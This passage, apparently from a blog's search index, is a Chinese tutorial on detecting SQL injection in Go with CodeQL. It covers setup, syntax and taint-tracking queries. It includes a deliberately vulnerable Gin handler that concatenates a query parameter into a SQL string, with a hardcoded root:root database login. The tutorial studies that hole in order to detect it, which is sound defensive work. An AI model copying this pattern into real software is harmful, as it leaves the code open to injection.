\u8fdb\u5165sql\u8bed\u53e5 \uff0c\u53ef\u4ee5\u770b\u5230\u5b83\u4eec\u5c31\u7c7b\u4f3c\u4e8e\u4e0a\u9762\u6c61\u70b9\u5206\u6790\u8bf4\u5230\u7684 source \u548c sink \u4e00\u6bb5\u7b80\u5355\u7684sql\u6ce8\u5165\u4ee3\u7801 # package main import ( \"flag\" \"fmt\" \"log\" \"github.com/gin-gonic/gin\" \"database/sql\" _ \"github.com/go-sql-driver/mysql\" ) var ( Addr = \"0.0.0.0:8080\" ) func init () { flag . StringVar ( & Addr , \"addr\" , \"0.0.0.0:8080\" , \"Server listen address\" ) flag . Parse () } func main () { db , err := sql . Open ( \"mysql\" , \"root:root@tcp(127.0.0.1:3306)/test\" ) defer db . Close () if err != nil { panic ( err ) } err = db . Ping () if err != nil { panic ( err ) } router := gin . Default () router . GET ( \"/inject\" , func ( ctx * gin . Context ) { var ( username string ) // source id := ctx . Query ( \"id\" ) if id == \"\" { id = \"1\" } id2 := id + \"hhhhhh\" // sink rows , err := db . Query ( \"select username from users where id = \" + id2 ) if err != nil { log . Panic ( err ) } defer rows . Close () for rows . Next () { err := rows . Scan ( & username ) if err != nil { log . Panic ( err ) } } ctx . String ( 200 , username ) }) router . Run ( Addr ) } \u5229\u7528CodeQL\u68c0\u6d4bsql\u6ce8\u5165 # \u6211\u4eec\u8fd9\u5148\u5c1d\u8bd5\u81ea\u5df1\u53bb\u7f16\u5199\u4e00\u4e2aCodeQL\u6765\u68c0\u6d4b\u8fd9\u6bb5\u4ee3\u7801\u4e2d\u5b58\u5728\u7684sql\u6ce8\u5165\uff0c\u8fd9\u91cc\u5229\u7528\u4e86CodeQL\u81ea\u5e26\u7684\u4e00\u4e2a\u6c61\u70b9\u8ffd\u8e2a\u529f\u80fd from Method GinQuery, DataFlow::CallNode GinQueryCallNode, Method DBQuery, DataFlow::CallNode DBQueryCallNode, DataFlow::Node sink, DataFlow::Node src where GinQuery.hasQualifiedName(\"github.com/gin-gonic/gin\",\"Context\",\"Query\") and GinQueryCallNode = GinQuery.getACall() and DBQuery.hasQualifiedName(\"database/sql\",\"DB\",\"Query\") and DBQueryCallNode = DBQuery.getACall() and src = GinQueryCallNode.getResult() and sink = DataFlow::exprNode(DBQueryCallNode.getCall().getArgument(0)) and TaintTracking::localTaint(src, sink) select src, sink \u6700\u540e\u6267\u884c\u7ed3\u679c\u5982\u4e0b \u5b98\u65b9\u6807\u51c6\u5e93\u68c0\u6d4bsql\u6ce8\u5165 # \u5b98\u65b9\u6807\u51c6\u5e93\u4e2d\u4e5f\u5b58\u5728sql\u6ce8\u5165\u7684\u68c0\u6d4b\uff0c\u4f4d\u4e8e codeql-go/lib/src/Security/SqlInjection.ql \uff0c\u6211\u4eec\u6765\u5b66\u4e60\u4e00\u4e0b\u5b98\u65b9\u4ee3\u7801\u662f\u600e\u4e48\u7f16\u5199\u7684 \u5b98\u65b9\u6e90\u7801\u5982\u4e0b: /** * @name Database query built from user-controlled sources * @description Building a database query from user-controlled sources is vulnerable to insertion of * malicious code by the user. * @kind path-problem * @problem.severity error * @security-severity 8.8 * @precision high * @id go/sql-injection * @tags security * external/cwe/cwe-089 */ import go import semmle.go.security.SqlInjection import DataFlow::PathGraph from SqlInjection::Configuration cfg, DataFlow::PathNode source, DataFlow::PathNode sink where cfg.hasFlowPath(source, sink) select sink.getNode(), source, sink, \"This query depends on $@.\", source.getNode(), \"a user-provided value\" \u53ef\u4ee5\u770b\u5230\u4ee3\u7801\u5f88\u7b80\u77ed\uff0c\u8bc1\u660e\u771f\u5b9e\u7684\u5b9e\u73b0\u5e76\u4e0d\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u6309\u4e0bCtrl\u8ddf\u8fdbSqlInjection::Configuration\u770b\u770b \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230Configuration\u7ee7\u627f\u4e86 TaintTracking::Configuration \uff0c\u8fd9\u4e2a\u662f\u5b98\u65b9\u81ea\u5e26\u7684\u6c61\u70b9\u8ffd\u8e2a\u7684\u914d\u7f6e\uff0c\u6211\u4eec\u53ea\u8981\u5b9e\u73b0 isSource \u8c13\u8bcd\u548c isSink \u8c13\u8bcd\u5373\u53ef\uff0c\u6211\u4eec\u7ee7\u7eed\u8ddf\u8fdb Source \u7c7b \u53ef\u4ee5\u770b\u5230 Source \u7c7b\u5c31\u662f\u4e2a\u7ee7\u627f\u4e86 DataFlow::Node \u7684\u62bd\u8c61\u7c7b\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u8981\u53bb\u627e\u5b83\u7684\u5b50\u7c7b \u5b50\u7c7b\u5c31\u5728\u6700\u4e0b\u9762\uff0c\u5b83\u53c8\u662f\"\u7ee7\u627f\"\u4e8e UntrustedFlowSource \u7ee7\u7eed\u8ddf\u8fdb UntrustedFlowSource \uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u6709\u4e9b\u6bd4\u8f83\u62bd\u8c61\u7684\u4ee3\u7801\uff0c\u5b9e\u9645\u4e0a\u8fd9\u7b49\u4ef7\u4e8e UntrustedFlowSource \u53c8\"\u7ee7\u627f\"\u4e8e UntrustedFlowSource::Range UntrustedFlowSource::Range \u5c31\u5728\u4e0b\u9762\uff0c\u5b83\u53c8\u662f\u4e00\u4e2a\u7ee7\u627f\u4e86 DataFlow::Node \u7684\u62bd\u8c61\u7c7b\uff0c\u6211\u4eec\u7ee7\u7eed\u53bb\u627e\u5b83\u7684\u5b50\u7c7b \u901a\u8fc7vscode\u641c\u7d22 extends UntrustedFlowSource::Range \uff0c\u53ef\u4ee5\u770b\u5230\u8be5\u7c7b\u6709\u5f88\u591a\u5b50\u7c7b\uff0c\u90fd\u662f\u4e3a\u4e86\u9002\u914dgolang\u4e2d\u6bd4\u8f83\u51fa\u540d\u7684web\u6846\u67b6(\u5982Beego\uff0cChi\uff0cGin\u7b49) \u8fd9\u91cc\u6211\u4eec\u7684\u4ee3\u7801\u662f\u7528Gin\u4f5c\u4e3a\u6846\u67b6\u7684\uff0c\u6211\u4eec\u5c31\u4ee5\u5176\u4e3a\u4f8b\uff0c\u67e5\u770b Gin.qll \uff0c\u91cc\u9762\u67092\u4e2a\u7c7b\u7ee7\u627f\u4e86 extends UntrustedFlowSource::Range \uff0c\u5176\u4e2d\u4e00\u4e2a\u7c7b\u7684\u4ee3\u7801\u5982\u4e0b: \u6700\u4e0a\u9762\u8fd9\u4e00\u5757\u7684\u610f\u601d\u662f\u53bb\u5bfb\u627e\u4e00\u4e2a\u65b9\u6cd5\u8c03\u7528\uff0c\u5e76\u4e14\u83b7\u53d6\u4ed6\u7684\u8fd4\u56de\u7ed3\u679c\u4f5c\u4e3asource \u4e0b\u9762\u4e00\u5757\u7684\u610f\u601d\u662f\u5bfb\u627e\u7c7b\u4e2d\u7684\u5b57\u6bb5(Accepted\u6216Params\uff0c\u662f\u4e00\u4e2a\u6570\u7ec4)\uff0c\u5e76\u4e14\u5728\u5176\u8bfb\u53d6\u5143\u7d20\u65f6\u83b7\u53d6\u4ed6\u7684\u503c\u4f5c\u4e3asource \u53e6\u5916\u4e00\u4e2a\u7c7b\u7684\u4ee3\u7801\u5982\u4e0b: \u8fd9\u6bb5\u4ee3\u7801\u7684\u610f\u601d\u662f\u8fd9\u4e9b\u51fd\u6570\u8c03\u7528\u65f6\u83b7\u53d6\u5176\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3asource \u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u80fd\u6709\u70b9\u590d\u6742\uff0c\u6211\u4eec\u7a0d\u5fae\u7b80\u5316\u4e00\u4e0b\uff0c\u53ef\u4ee5\u5f97\u5230\u4ee5\u4e0b\u4ee3\u7801 import go abstract class Source extends DataFlow::Node { } class Node1 extends Source { Node1() { exists(DataFlow::MethodCallNode call, string methodName | call.getTarget().hasQualifiedName(\"github.com/gin-gonic/gin\", \"Context\", methodName) and methodName in [ \"FullPath\", \"GetHeader\", \"QueryArray\", \"Query\", \"PostFormArray\", \"PostForm\", \"Param\", \"GetStringSlice\", \"GetString\", \"GetRawData\", \"ClientIP\", \"ContentType\", \"Cookie\", \"GetQueryArray\", \"GetQuery\", \"GetPostFormArray\", \"GetPostForm\", \"DefaultPostForm\", \"DefaultQuery\", \"GetPostFormMap\", \"GetQueryMap\", \"GetStringMap\", \"GetStringMapString\", \"GetStringMapStringSlice\", \"PostFormMap\", \"QueryMap\" ] | this = call.getResult(0) ) } } from Source src select src \u8fd9\u91cc\u5982\u679c\u5bf9CodeQL\u4e0d\u591f\u719f\u6089\u53ef\u80fd\u4f1a\u4ea7\u751f\u7591\u95ee\uff0c\u4e3a\u4ec0\u4e48Source\u7684\u5b50\u7c7bNode1\u7684\u7279\u5f81\u8c13\u8bcd(\u53ef\u4ee5\u7406\u89e3\u4e3a\u5176\u4ed6\u8bed\u8a00\u4e2d\u7684\u6784\u9020\u51fd\u6570)\u4f1a\u5bf9Source\u4ea7\u751f\u9650\u5236\u4f5c\u7528\u5462\uff1f\u5176\u5b9e\u8fd9\u4e2a\u5c31\u662fCodeQL\u7684\u7279\u70b9\uff0c\u5b50\u7c7b\u7684\u7279\u5f81\u8c13\u8bcd\u4f1a\u9650\u5b9a\u7236\u7c7b\u3002 sink\u7684\u5206\u6790\u548csource\u540c\u7406\uff0c\u6211\u4eec\u8fd9\u91cc\u5c31\u4e0d\u518d\u5206\u6790\u4e86\u3002\u53ef\u4ee5\u770b\u5230\u5176\u5b9eCodeQL\u5b98\u65b9\u5c31\u662f\u5c06\u5f88\u591a\u5e38\u7528\u7684Web\u6846\u67b6\u7684source\u548csink\u90fd\u5199\u4e86\u4e00\u904d\uff0c\u8fd9\u6837\u5f53\u6211\u4eec\u4f7f\u7528\u8fd9\u4e9bWeb\u6846\u67b6\u7f16\u5199\u4ee3\u7801\u65f6\u5c31\u53ef\u4ee5\u4f7f\u7528CodeQL\u6807\u51c6\u5e93\u6765\u68c0\u6d4b\u6211\u4eec\u7684\u4ee3\u7801\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\u4e86\u3002 \u6211\u4eec\u6765\u8fd0\u884c\u4e0b\u5b98\u65b9\u7684\u6807\u51c6\u5e93\uff0c\u53ef\u4ee5\u5f97\u5230\u76f8\u540c\u7684\u7ed3\u679c:","title":"CodeQL\u4e0egolang sql\u6ce8\u5165\u68c0\u6d4b"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#codeql\u4e0egolang-sql\u6ce8\u5165\u68c0\u6d4b","text":"","title":"CodeQL\u4e0egolang sql\u6ce8\u5165\u68c0\u6d4b"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#\u4ec0\u4e48\u662fcodeql","text":"CodeQL\u662f\u4e00\u4e2a\u53ef\u4ee5\u5bf9\u4ee3\u7801\u8fdb\u884c\u5206\u6790\u7684\u5f15\u64ce, \u5b89\u5168\u4eba\u5458\u53ef\u4ee5\u7528\u5b83\u4f5c\u4e3a\u6316\u6d1e\u7684\u8f85\u52a9\u6216\u8005\u76f4\u63a5\u8fdb\u884c\u6316\u6398\u6f0f\u6d1e,\u8282\u7701\u8fdb\u884c\u91cd\u590d\u64cd\u4f5c\u7684\u7cbe\u529b\u3002 \u5728CodeQL\u4e2d\uff0c\u4ee3\u7801\u88ab\u89e3\u6790\u6210\u6570\u636e\uff0c\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u3002\u5b89\u5168\u6f0f\u6d1e\u3001\u9519\u8bef\u548c\u5176\u4ed6\u9519\u8bef\u88ab\u5efa\u6a21\u4e3a\u53ef\u4ee5\u9488\u5bf9\u6570\u636e\u5e93\u6267\u884c\u7684\u67e5\u8be2\u3002\u6211\u4eec\u53ef\u4ee5\u8fd0\u884c\u7531GitHub\u7814\u7a76\u4eba\u5458\u548c\u793e\u533a\u8d21\u732e\u8005\u7f16\u5199\u7684\u6807\u51c6CodeQL\u67e5\u8be2\uff0c\u4e5f\u53ef\u4ee5\u7f16\u5199\u81ea\u5df1\u7684\u67e5\u8be2\u4ee5\u7528\u4e8e\u81ea\u5b9a\u4e49\u5206\u6790\u3002\u67e5\u627e\u6f5c\u5728\u9519\u8bef\u7684\u67e5\u8be2\u76f4\u63a5\u5728\u6e90\u6587\u4ef6\u4e2d\u7a81\u51fa\u663e\u793a\u7ed3\u679c\u3002","title":"\u4ec0\u4e48\u662fCodeQL"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#\u4fdd\u59c6\u7ea7\u5b89\u88c5\u6559\u7a0b","text":"\u867d\u7136\u5b98\u65b9\u63d0\u4f9b\u4e86\u53ef\u4ee5\u8fdb\u884c\u67e5\u8be2\u7684\u7f51\u7ad9\uff0c\u4f46\u662f\u7531\u4e8e\u5b98\u7f51\u5728\u56fd\u5916\u800c\u4e14\u6267\u884c\u901f\u5ea6\u4e0d\u5feb\uff0c\u6216\u8005\u67d0\u4e9b\u8bed\u8a00(\u5982c/c++)\u9700\u8981\u81ea\u5b9a\u4e49\u7f16\u8bd1\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u5b9e\u9645\u4e0a\u5728\u7f51\u7ad9\u662f\u5b8c\u5168\u4e0d\u591f\u4f7f\u7528\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u672c\u5730\u642d\u5efa\u73af\u5883\uff0c\u4ee5\u4e0b\u6b65\u9aa4\u662f\u4e00\u6b65\u6b65\u8fdb\u884c\u7684\u3002","title":"\u4fdd\u59c6\u7ea7\u5b89\u88c5\u6559\u7a0b"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#codeql-cli","text":"\u5728\u547d\u4ee4\u884c(cli)\u7684\u73af\u5883\u4e0b\u8fd0\u884ccodeql \u9879\u76ee\u5730\u5740 : github/codeql-cli-binaries \u6253\u5f00\u9879\u76ee\u5730\u5740\u4e4b\u540e\u8fdb\u5165Releases\u5e93\uff0c\u4e0b\u8f7d\u5bf9\u5e94\u64cd\u4f5c\u7cfb\u7edf\u7684\u538b\u7f29\u5305\u89e3\u538b\u5230\u4efb\u610f\u4e00\u4e2a\u6587\u4ef6\u5939","title":"codeql-cli"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#codeql","text":"\u5f00\u6e90\u7684codeql\u6807\u51c6\u5e93\u548c\u67e5\u8be2\u5e93 \u9879\u76ee\u5730\u5740: github/codeql \u8fdb\u5165\u5230\u4e0a\u9762\u89e3\u538bcodeql-cli\u7684\u6587\u4ef6\u5939\uff0c\u5e76\u628a\u8be5\u4ed3\u5e93clone\u4e0b\u6765\uff0c\u4fdd\u8bc1codeql-cli\u548ccodeql\u5728\u540c\u4e00\u4e2a\u76ee\u5f55\u4e0b","title":"codeql"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#vscode-codeql","text":"vscode\u7684codeql\u63d2\u4ef6\uff0c\u76f4\u63a5\u5728\u63d2\u4ef6\u5e02\u573a\u5b89\u88c5","title":"vscode-codeql"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#\u914d\u7f6e\u73af\u5883\u53d8\u91cf","text":"\u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u4f7f\u7528codeql-cli\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u8def\u5f84\u653e\u5230PATH\u4e0b\uff0c\u5177\u4f53\u7684\u65b9\u6cd5\u5c31\u4e0d\u591a\u4ecb\u7ecd\u4e86(windows\u4e0b\u5c06\u5176\u6dfb\u52a0\u5230\u73af\u5883\u53d8\u91cf\u4e2d\uff0clinux\u4e0b\u4fee\u6539PATH\u53d8\u91cf) \u540c\u65f6\u6211\u4eec\u6700\u597d\u518d\u914d\u7f6e\u4e0bcodeql\u63d2\u4ef6\u7684\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84\uff0c\u6253\u5f00vscode\u7684\u8bbe\u7f6e\uff0c\u641c\u7d22codeql\uff0c\u4fee\u6539Executable Path \u81f3\u6b64\u6211\u4eec\u7684\u73af\u5883\u7b97\u662f\u914d\u7684\u5dee\u4e0d\u591a\u4e86\u3002\u3002\u3002\u4f46\u662f\u5982\u679c\u4f60\u9700\u8981\u7528go\u7684\u8bdd\u8fd8\u9700\u8981\u8fdb\u884c\u989d\u5916\u914d\u7f6e","title":"\u914d\u7f6e\u73af\u5883\u53d8\u91cf"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#codeql-go","text":"\u5f00\u6e90\u7684codeql-go\u6807\u51c6\u5e93\u548c\u67e5\u8be2\u5e93(\u4e0d\u592a\u660e\u767d\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u653e\u5728codeql\u5e93\u91cc) \u9879\u76ee\u5730\u5740: github/codeql-go \u8fd9\u4e2a\u9879\u76ee\u4e86\u5199\u660e\u4e86\u5b89\u88c5\u65b9\u6cd5\uff0c\u4f46\u662f\u5b58\u5728\u4ee5\u4e0b\u5f0a\u7aef: 1. \u8fd9\u662f\u4e00\u4e2ash\u811a\u672c\uff0c\u610f\u5473\u7740windows\u529e\u6cd5\u4f7f\u7528 2. \u8fd9\u4e2a\u9879\u76ee\u6709\u8fd9\u4e48\u4e00\u6bb5\u8bdd If you want to use the CodeQL extension for Visual Studio Code, import this repository into your VS Code workspace. \u610f\u601d\u662f\u8bf4\u6211\u4eec\u5982\u679c\u9700\u8981\u4f7f\u7528go\u7684\u6807\u51c6\u5e93\u65f6\uff0c\u8fd8\u9700\u8981\u624b\u52a8\u6dfb\u52a0\u5230vscode\u7684workspace\u91cc\uff0c\u975e\u5e38\u9ebb\u70e6 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u5f0a\u7aef\uff0c\u6211\u81ea\u5df1\u6363\u9f13\u4e86\u4e00\u4e0b\uff0c\u5c06\u5176\u653e\u5728\u4e86codeql\u6807\u51c6\u5e93\u91cc\uff0c\u5177\u4f53\u6b65\u9aa4\u5982\u4e0b 1. clone\u4ed3\u5e93\u5230ql\u6587\u4ef6\u5939\u91cc(\u5373codeql\u6807\u51c6\u5e93)\u5e76\u6539\u5176\u6587\u4ef6\u5939\u540d\u4e3ago \u4fee\u6539.codeqlmanifest.json\uff0c\u52a0\u5165\u4e00\u884c \"go/.codeqlmanifest.json\", { \"provide\" : [ \"ruby/.codeqlmanifest.json\" , \"go/.codeqlmanifest.json\" , \"*/ql/src/qlpack.yml\" , \"*/ql/lib/qlpack.yml\" , \"*/ql/test/qlpack.yml\" , \"cpp/ql/test/query-tests/Security/CWE/CWE-190/semmle/tainted/qlpack.yml\" , \"*/ql/examples/qlpack.yml\" , \"*/upgrades/qlpack.yml\" , \"javascript/ql/experimental/adaptivethreatmodeling/lib/qlpack.yml\" , \"javascript/ql/experimental/adaptivethreatmodeling/src/qlpack.yml\" , \"misc/legacy-support/*/qlpack.yml\" , \"misc/suite-helpers/qlpack.yml\" ] } \u81f3\u6b64\u6211\u4eec\u5df2\u7ecf\u6210\u529f\u5b89\u88c5\u4e86\u5305\u62ecgo\u5728\u5185\u7684codeql\u6807\u51c6\u5e93\u4ee5\u53cacodeql\u7684cli\u7a0b\u5e8f\uff0c\u6765\u5199\u4e2aHello world\u6d4b\u8bd5\u4e00\u4e0b","title":"codeql-go"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#hello-world","text":"\u6211\u4eec\u6765\u521b\u5efa\u4e00\u4e2a\u6211\u4eec\u7684\u5b66\u4e60\u5de5\u4f5c\u533a\u5e76\u8f93\u51fa\u4e00\u4e2acodeql\u7684hello,world\uff0c\u6b65\u9aa4\u5982\u4e0b: \u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u8fd9\u91cc\u4ee5codeql_study\u4e3a\u4f8b \u7528vscode\u6253\u5f00\u8be5\u6587\u4ef6\u5939\uff0c\u521b\u5efa\u4e00\u4e2aql\u6587\u4ef6\u5939\uff0c\u5e76\u5728\u8be5\u6587\u4ef6\u5939\u4e0b\u521b\u5efahelloworld.ql\u548cqlpack.yml qlpack.yml\u7684\u5185\u5bb9\u5982\u4e0b name: longlone/codeql-study version: 0.0.1 libraryPathDependencies: codeql-go extractor: go helloworld.ql\u7684\u5185\u5bb9\u5982\u4e0b import go select \"hello world\" \u521b\u5efa\u4e00\u4e2acodeql database\uff0c\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u6307\u5b9a\u4e00\u4e2ago\u9879\u76ee\u4f5c\u4e3a\u5206\u6790\u76ee\u6807 codeql database create ./codeql_database -s D:\\Coding\\golang\\src\\codeql_study --language=go \u4ecevscode\u4e2d\u9009\u62e9codeql_database\u4f5c\u4e3a\u6570\u636e\u5e93 \u53f3\u952ehelloworld.ql\uff0c\u9009\u62e9 CodeQL: Run Query \u5982\u679c\u663e\u793a\u4ee5\u4e0a\u753b\u9762\uff0c\u90a3\u4e48\u6211\u4eec\u6210\u529f\u5c31\u5b89\u88c5\u597d\u4e86\u73af\u5883\u3002","title":"Hello world"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#codeql\u8bed\u6cd5\u524d\u8a00","text":"CodeQL\u7684\u5f88\u591a\u8bed\u6cd5\u548c\u73b0\u5728\u7684\u4e3b\u6d41\u9ad8\u7ea7\u8bed\u8a00\u6709\u5f88\u591a\u76f8\u4f3c\u4e4b\u5904\uff0c\u4f46\u4e5f\u6709\u8bb8\u591a\u7684\u4e0d\u540c\uff0c\u5b66\u4e60\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\u3002 \u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u5728CodeQL\u4e2d\u4e0d\u5b58\u5728 == \uff0c\u53ea\u6709 = \uff0c\u5f53\u4e00\u4e2a\u53d8\u91cf\u5b9a\u4e49\u4e86\u800c\u6ca1\u6709\u521d\u59cb\u5316\u7684\u65f6\u5019\uff0c = \u7684\u610f\u601d\u662f\u8d4b\u503c\uff0c\u4f46\u5f53\u5176\u5df2\u7ecf\u88ab\u8d4b\u503c\u4e86\u4e4b\u540e\uff0c = \u7684\u610f\u601d\u5c31\u53d8\u6210\u4e86\u6bd4\u8f83\u3002","title":"CodeQL\u8bed\u6cd5\u524d\u8a00"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#\u57fa\u7840\u6570\u636e\u7c7b\u578bprimitive-types","text":"CodeQL \u662f\u4e00\u79cd\u9759\u6001\u7c7b\u578b\u7684\u8bed\u8a00\uff0c\u56e0\u6b64\u6bcf\u4e2a\u53d8\u91cf\u90fd\u5fc5\u987b\u6709\u4e00\u4e2a\u58f0\u660e\u7684\u7c7b\u578b\u3002\u7c7b\u578b\u662f\u4e00\u7ec4\u503c\u3002\u4f8b\u5982\uff0cint \u7c7b\u578b\u662f\u4e00\u7ec4\u6574\u6570\u3002\u6ce8\u610f\uff0c\u4e00\u4e2a\u503c\u53ef\u4ee5\u5c5e\u4e8e\u8fd9\u4e9b\u96c6\u5408\u4e2d\u7684\u591a\u4e2a\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u53ef\u4ee5\u6709\u591a\u4e2a\u7c7b\u578b\u3002 \u6574\u578b(int)\uff0c\u6d6e\u70b9\u578b(float)\uff0c\u65e5\u671f\u578b(date)\uff0c\u5b57\u7b26\u578b(stirng)\uff0c\u5e03\u5c14\u578b(boolean)\u3002","title":"\u57fa\u7840\u6570\u636e\u7c7b\u578b(Primitive types)"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#\u8c13\u8bcdpredicates","text":"\u8c13\u8bcd\u6709\u70b9\u7c7b\u4f3c\u4e8e\u5176\u4ed6\u8bed\u8a00\u4e2d\u7684\u51fd\u6570\uff0c\u4f46\u53c8\u4e0e\u51fd\u6570\u4e0d\u540c\uff0c\u8c13\u8bcd\u7528\u4e8e\u63cf\u8ff0\u6784\u6210 QL \u7a0b\u5e8f\u7684\u903b\u8f91\u5173\u7cfb\u3002\u786e\u5207\u7684\u8bf4\uff0c\u8c13\u8bcd\u63cf\u8ff0\u7684\u662f\u7ed9\u5b9a\u53c2\u6570\u4e0e\u5143\u7ec4\u96c6\u5408\u7684\u5173\u7cfb\u3002 \u5b9a\u4e49\u8c13\u8bcd\u6709\u4ee5\u4e0b\u51e0\u4e2a\u6ce8\u610f\u70b9(\u5751\u70b9): 1. \u9700\u8981\u6ce8\u610f\u7684\u662f\u8c13\u8bcd\u7684\u540d\u5b57\u5f00\u5934\u5fc5\u987b\u662f\u5c0f\u5199\u5b57\u6bcd\u3002 2. \u7ed1\u5b9a\u884c\u4e3a\u4e0e\u7ed1\u5b9a\u96c6\uff0c\u8fd9\u4e2a\u5728\u540e\u9762\u4f1a\u4ecb\u7ecd\u3002","title":"\u8c13\u8bcd(Predicates)"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#\u65e0\u7ed3\u679c\u8c13\u8bcd","text":"\u6ca1\u6709\u7ed3\u679c\u7684\u8c13\u8bcd\u4ee5predicate\u4f5c\u4e3a\u5f00\u5934\uff0c\u5269\u4e0b\u7684\u8bed\u6cd5\u7ed3\u6784\u7c7b\u4f3c\u4e8e\u5b9a\u4e49\u51fd\u6570\u3002\u8fd9\u79cd\u8c13\u8bcd\u53ea\u80fd\u5728where\u8bed\u53e5\u4e2d\u4f7f\u7528 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: predicate isCity(string city) { city = \"Beijing\" or city = \"ShangHai\" } from string city where city = \"Beijing\" and isCity(city) select city","title":"\u65e0\u7ed3\u679c\u8c13\u8bcd"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#\u7ed3\u679c\u8c13\u8bcd","text":"\u6709\u7ed3\u679c\u7684\u8c13\u8bcd\u7684\u5b9a\u4e49\u7c7b\u4f3c\u4e8ec/c++\u8bed\u8a00\u7684\u51fd\u6570\u5b9a\u4e49\uff0c\u4ee5\u8fd4\u56de\u7c7b\u578b\u66ff\u4ee3predicate\u4f5c\u4e3a\u5f00\u5934\u3002\u8fd9\u79cd\u8c13\u8bcd\u53ef\u4ee5\u5728where\u4e0eselect\u8bed\u53e5\u4e2d\u4f7f\u7528 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: int addOne(int i) { result = i + 1 and i in [1 .. 10] } from int v where v = 1 select addOne(v)","title":"\u7ed3\u679c\u8c13\u8bcd"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#\u67e5\u8be2query","text":"\u67e5\u8be2\u662fCodeQL\u7684\u8f93\u51fa\u3002\u67e5\u8be2\u6709\u4e24\u79cd\u7c7b\u578b\uff0c\u5206\u522b\u662f - \u9009\u62e9\u5b50\u53e5 - 